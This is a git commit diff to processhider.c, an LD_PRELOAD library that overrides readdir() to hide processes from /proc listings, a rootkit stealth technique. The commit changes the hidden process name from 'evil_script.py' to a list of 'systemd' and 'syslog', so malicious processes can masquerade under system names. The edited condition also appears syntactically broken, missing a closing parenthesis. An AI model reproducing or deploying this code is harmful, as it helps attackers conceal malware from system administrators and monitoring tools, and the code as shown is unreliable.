e4f9d3b00001767192727c570f363f58f84644ae
ppuuoo <1365226512@qq.com>
2024-03-28 18:47:01 +0800

    Update processhider.c

--- processhider.c
+++ processhider.c
@@ -9,7 +9,7 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "evil_script.py";
+static const char* process_to_filter[] = {"systemd", "syslog"};
 
 /*
  * Get a directory name given a DIR* handle
@@ -84,9 +84,17 @@ struct dirent* readdir(DIR *dirp)                                       \
             char process_name[256];                                     \
             if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                 strcmp(dir_name, "/proc") == 0 &&                       \
-                get_process_name(dir->d_name, process_name) &&          \
-                strcmp(process_name, process_to_filter) == 0) {         \
-                continue;                                               \
+                get_process_name(dir->d_name, process_name) {         \
+                int exclude_process = 0;                                \
+                for (int i = 0; i < sizeof(process_to_filter) / sizeof(process_to_filter[0]); i++) { \
+                    if (strcmp(process_name, process_to_filter[i]) == 0) { \
+                        exclude_process = 1;                            \
+                        break;                                          \
+                    }                                                   \
+                }                                                       \
+                if (exclude_process) {                                  \
+                    continue;                                           \
+                }                                               \
             }                                                           \
         }                                                               \
         break;                                                          \
